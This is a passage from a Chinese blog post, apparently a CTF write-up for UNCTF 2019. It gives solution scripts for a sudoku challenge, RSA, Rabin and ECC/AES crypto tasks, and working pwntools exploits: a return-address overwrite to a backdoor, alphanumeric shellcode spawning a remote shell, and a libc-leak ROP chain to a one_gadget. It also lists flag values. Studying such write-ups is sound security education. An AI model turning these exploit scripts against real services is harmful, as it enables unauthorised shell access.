class="string">"+-+-+-+-+-+-+-+-+-+"</span>)</span><br><span class="line">sudoku=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">content</span>:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">""</span>:</span><br><span class="line">        sudoku.<span class="built_in">append</span>(i.replace(<span class="string">" "</span>,<span class="string">"0"</span>)[<span class="number">1</span>:-<span class="number">1</span>].<span class="built_in">split</span>(<span class="string">"|"</span>))</span><br><span class="line">#<span class="built_in">print</span> sudoku</span><br><span class="line"></span><br><span class="line">def find_index(s):</span><br><span class="line">    flag=list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="built_in">row</span>=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i][j]=='<span class="number">0</span>':</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">        flag.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> flag</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">def not_done(s):</span><br><span class="line">    <span class="built_in">return</span> True <span class="keyword">in</span> [<span class="number">0</span> <span class="keyword">in</span> r <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line">def get_row(s, r):</span><br><span class="line">    <span class="built_in">return</span> s[r]</span><br><span class="line"></span><br><span class="line">def get_column(s, c):</span><br><span class="line">    <span class="built_in">return</span> [r[c] <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_possible(s, r, c):</span><br><span class="line">    <span class="built_in">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) \</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_row(s, r) \</span><br><span class="line">                <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_column(s, c)]</span><br><span class="line"></span><br><span class="line">def go_around(s):</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> index_r, r <span class="keyword">in</span> enumerate(s): #row_index <span class="keyword">and</span> <span class="built_in">row</span></span><br><span class="line">        <span class="built_in">row</span> = []</span><br><span class="line">        <span class="keyword">for</span> index_c, c <span class="keyword">in</span> enumerate(r): #each <span class="keyword">in</span> <span class="built_in">row</span></span><br><span class="line">            c=int(c)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == c:</span><br><span class="line">                maybe_ans = get_possible(s, index_r, index_c)</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(maybe_ans[<span class="number">0</span>] <span class="keyword">if</span> len(maybe_ans) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(c)</span><br><span class="line">        ans.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> ans</span><br><span class="line"></span><br><span class="line">def print_sudoku(s, msg):</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">" "</span>.<span class="built_in">join</span>([str(c) <span class="keyword">for</span> c <span class="keyword">in</span> r])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"*"</span>*<span class="number">18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#print_sudoku(sudoku, <span class="string">"initializing..."</span>)</span><br><span class="line">FLAG=find_index(sudoku)</span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line">sudoku = go_around(sudoku)</span><br><span class="line">#print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">#counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> not_done(sudoku):</span><br><span class="line">    sudoku = go_around(sudoku)</span><br><span class="line">    #print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">   # counter += <span class="number">1</span></span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">if</span> FLAG[<span class="number">0</span>][i] == <span class="number">1</span>:</span><br><span class="line">        answer+=str(sudoku[<span class="number">0</span>][i])+<span class="string">","</span></span><br><span class="line">answer=answer[:-<span class="number">1</span>]</span><br><span class="line">sh.sendline(answer)</span><br><span class="line">#<span class="built_in">print</span> answer</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    sh.recvuntil(<span class="string">"answer :"</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> FLAG[i][j]==<span class="number">1</span>:</span><br><span class="line">           answer+=str(sudoku[i][j])+<span class="string">","</span></span><br><span class="line">    answer=answer[:-<span class="number">1</span>]</span><br><span class="line">    sh.sendline(answer)</span><br><span class="line">    #<span class="built_in">print</span> answer</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><a href="https://p0.ssl.qhimg.com/t01085b7d87603dfcf5.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>得到flag：flag{b613e841e0822e2925376d5373cbfbc4}</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="不仅仅是RSA"><a href="#不仅仅是RSA" class="headerlink" title="不仅仅是RSA"></a>不仅仅是RSA</h3><p>下载附件得到五个文件，</p>
<p>两个音频文件，看波形图，是摩斯密码，解密得到c1,c2</p>
<p>两个pem文件，用openssh打开得到两个模n和相同的e</p>
<p>根据加密脚本得知两个n有公约数</p>
<p>所以已知e p q</p>
<p>基础rsa解密，</p>
<p>exp：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def GCD(a, b):</span><br><span class="line"></span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span><br><span class="line">c2=485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span><br><span class="line"></span><br><span class="line">e=mpz(41221)</span><br><span class="line"></span><br><span class="line">n1=int('0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B',16)</span><br><span class="line"></span><br><span class="line">n2=int('0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553',16)</span><br><span class="line"></span><br><span class="line"><span class="comment">#q=GCD(n1,n2)</span></span><br><span class="line">q = mpz(95652716952085928904432251307911783641637100214166105912784767390061832540987)</span><br><span class="line">print n2/q</span><br><span class="line">p1 = mpz(107527961531806336468215094056447603422487078704170855072884726273308088647617)</span><br><span class="line">p2 = mpz(89485735722023752007114986095340626130070550475022132484632643785292683293897)</span><br><span class="line">assert p1*q==n1</span><br><span class="line">assert p2*q==n2</span><br><span class="line">d1 = invert(e,(p1-1)*(q-1))</span><br><span class="line">d2 = invert(e,(p2-1)*(q-1))</span><br><span class="line"></span><br><span class="line">m1 = hex(pow(c1,d1,n1))[2:].decode('hex')</span><br><span class="line">m2 = hex(pow(c2,d2,n2))[2:].decode('hex')</span><br><span class="line">print m1,m2</span><br></pre></td></tr></table></figure>

<p>flag：UNCTF{ac01dff95336aa470e3b55d3fe43e9f6}</p>
<h3 id="一句话加密"><a href="#一句话加密" class="headerlink" title="一句话加密"></a>一句话加密</h3><p>拿到文件，python文件里没有啥，正常的rsa加密，</p>
<p>然后用010editor打开另外一张图片，发现底下有内容</p>
<p><a href="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" alt="img"></a></p>
<p>猜测那个大数是n，先拿去分解一波，发现可行</p>
<p><a href="https://p0.ssl.qhimg.com/t01ecb1e951aebdcb5a.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>但是，e呢？</p>
<p>突然，发现被分解出来的p和q很熟悉</p>
<p>上<a href="https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">V爷爷博客</a>!</p>
<p>p、q出现在V爷爷的Rabin密码的脚本里，那么这题就是Rabin密码了，，</p>
<p>那么直接上V爷爷脚本</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def n2s(num):</span><br><span class="line">    t = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">       <span class="keyword">return</span> (<span class="string">'0'</span>+t).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> t.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">def decode(c):</span><br><span class="line">    p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">    q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">    n = p*q</span><br><span class="line">    r = <span class="keyword">pow</span>(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">    s = <span class="keyword">pow</span>(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">    a = gmpy2.invert(p,q)</span><br><span class="line">    b = gmpy2.invert(q,p)</span><br><span class="line">    x =(a*p*s+b*q*r)%n</span><br><span class="line">    y =(a*p*s-b*q*r)%n</span><br><span class="line">    <span class="keyword">print</span> n2s(x%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-x)%n)</span><br><span class="line">    <span class="keyword">print</span> n2s(y%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-y)%n)</span><br><span class="line"></span><br><span class="line">c1=<span class="number">62501276588435548378091741866858001847904773180843384150570636252430662080263</span></span><br><span class="line"></span><br><span class="line">c2=<span class="number">72510845991687063707663748783701000040760576923237697638580153046559809128516</span></span><br><span class="line"></span><br><span class="line">decode(c1)</span><br><span class="line">decode(c2)</span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" alt="img"></a></p>
<p>运行得到flag：unctf{412a1ed6d21e55191ee5131f266f5178}</p>
<h3 id="ECC和AES基础"><a href="#ECC和AES基础" class="headerlink" title="ECC和AES基础"></a>ECC和AES基础</h3><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/</a></p>
<p>将底下的脚本的数据替换下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">G</span>=E(6478678675, 5636379357093)</span><br><span class="line">pub = E(2854873820564,9226233541419)</span><br><span class="line"></span><br><span class="line">c1 = E(6860981508506,1381088636252)</span><br><span class="line">c2 = E(1935961385155, 8353060610242)</span><br><span class="line"></span><br><span class="line">X = G</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 3000000):</span><br><span class="line">    <span class="keyword">if</span> X == pub:</span><br><span class="line">       <span class="built_in"> secret </span>= i</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"[+] secret:"</span>, i</span><br><span class="line">        break</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        X = X + G</span><br><span class="line">        <span class="builtin-name">print</span> i</span><br><span class="line"></span><br><span class="line">m = c2 - (c1 * secret)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x:"</span>, m[0]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] y:"</span>, m[1]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x+y:"</span>, m[0] + m[1]</span><br></pre></td></tr></table></figure>

<p>爆破得到secret=2019813</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x</span>=1559343440829</span><br><span class="line"> <span class="attribute">y</span>=7468915163961</span><br></pre></td></tr></table></figure>

<p>x即为aes_key</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">from</span> <span class="type">Crypto</span>.<span class="type">Cipher</span> <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">key</span> = bytes('<span class="number">1559343440829</span>'.ljust(<span class="number">16</span>,' '))</span><br><span class="line"><span class="title">aes</span> = <span class="type">AES</span>.new(key, <span class="type">AES</span>.<span class="type">MODE_ECB</span>)  </span><br><span class="line"><span class="class"><span class="keyword">data</span>=base64.b64decode('/<span class="title">cM8Nx</span>+<span class="title">iAidmt6RiqX8Vww</span>==')</span></span><br><span class="line"><span class="title">ans</span> = aes.decrypt(<span class="class"><span class="keyword">data</span>)</span></span><br><span class="line"><span class="title">print</span> ans</span><br></pre></td></tr></table></figure>

<p>发现并不能解出来</p>
<p>这里有点小坑，C1和C2位置互换了</p>
<p>于是重新跑第一个脚本，C1和C2的值互换，secret之前已经爆破出来了</p>
<p>得到 x=1026</p>
<p>AES解密得</p>
<p>thisisa_flag</p>
<p>然后去目标url post</p>
<p>得到</p>
<p><a href="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" alt="img"></a></p>
<p>flag：401E48C9A96DC219C32AB5E75204B655</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Sosoeasypwn"><a href="#Sosoeasypwn" class="headerlink" title="Sosoeasypwn"></a>Sosoeasypwn</h3><p>原本想泄露canary，后无意间发现，eip竟然被覆盖了，于是手测，发现输入12个a后即可控制eip。（这里输入了12个a和3个b加1个回车，可见eip被覆盖成了bbb\n）</p>
<p><a href="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" alt="img"></a></p>
<p>IDA静态分析发现，是两个函数调用了同一个栈，然后栈内数据没清理，导致部分数据被重用</p>
<p><a href="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" alt="img"></a></p>
<p>所以导致合法输入就可以覆盖v1的值。</p>
<p>由于开启了eip保护，但程序本身已经给了16位（4个字符），ida里可以看到后门函数的相对偏移，9CD</p>
<p><a href="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" alt="img"></a></p>
<p><a href="https://p4.ssl.qhimg.com/t0196029343f5794798.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0196029343f5794798.png" alt="img"></a></p>
<p>基址后12位（3个字符）都是0，那么仅需要爆破一个字符即可得到拿到shell</p>
<p>exp：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                </span><br><span class="line">                #sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10000</span>)</span><br><span class="line">                <span class="keyword">sh</span> = process(<span class="string">"./pwn"</span>)</span><br><span class="line">              base_addr = <span class="keyword">sh</span>.recvuntil(<span class="string">' world'</span>)</span><br><span class="line">              base_addr = hex(<span class="keyword">int</span>(base_addr[-<span class="number">11</span>:-<span class="number">6</span>]))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'So, Can you tell me your name?'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.send(<span class="string">'a'</span>*<span class="number">12</span>+p32(<span class="keyword">int</span>(base_addr+<span class="string">'89cd'</span>,<span class="number">16</span>))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'Please'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.sendline(<span class="string">'ls'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">       except Exception <span class="keyword">as</span> <span class="keyword">e</span>:</span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<p><a href="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" alt="img"></a></p>
<p>得到flag：UNCTF{S0soE4zy_Pwn}</p>
<h3 id="EasyShellcode"><a href="#EasyShellcode" class="headerlink" title="EasyShellcode"></a>EasyShellcode</h3><p>反汇编看程序逻辑，就只是限制了shellcode的字符，要求在A-Za-z0-9之间</p>
<p>直接上V爷爷将shellcode转base64的工具</p>
<p><a href="https://github.com/veritas501/ae64" target="_blank" rel="noopener">https://github.com/veritas501/ae64</a></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'101.71.29.5'</span>,<span class="number">10080</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say?\n'</span>)</span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(sc)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" alt="img"></a></p>
<p>flag：UNCTF{x64A5c11shE11c0dEi550_Ea5y}</p>
<h3 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h3><p><a href="https://p2.ssl.qhimg.com/t01759f7cce9c0eaea9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p>
<p>这个很好绕过</p>
<p><a href="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" alt="img"></a></p>
<p>发现有一个栈溢出，而且retaddr做了限制，这样就不能直接ret到system了（这里我用的是one_gadget），但是可以找gadget绕过（这里我找的是 ret ）</p>
<p>其中libc版本用LibcSearcher泄露出来，然后payload的偏移需要用’\x00’来填充，以满足one_gadget的条件。</p>
<p><a href="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" alt="img"></a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyrop')</span></span><br><span class="line">sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048592</span></span><br><span class="line">ret = <span class="number">0x0804839e</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span>  + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">addr = u32(sh.recvuntil(<span class="string">'\xf7'</span>)[<span class="number">-5</span>:])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x3a819</span></span><br><span class="line"><span class="comment">#one_gadget = base + 0x3ac69</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">8</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span> + p32(ret) +p32(one_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 643713081@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">赏</a>
</p>


<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>2019 UNCTF</p>
    <p><span class="copy-title">文章字数:</span><span class="post-count">4.2k</span></p>
    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
    <p><span class="copy-title">发布时间:</span>2019-11-11, 15:12:35</p>
    <p><span class="copy-title">最后更新:</span>2020-05-01, 00:08:03</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/11/2019UNCTF/" title="2019 UNCTF">http://jayxv.github.io/2019/11/11/2019UNCTF/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2020 Van1sh</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
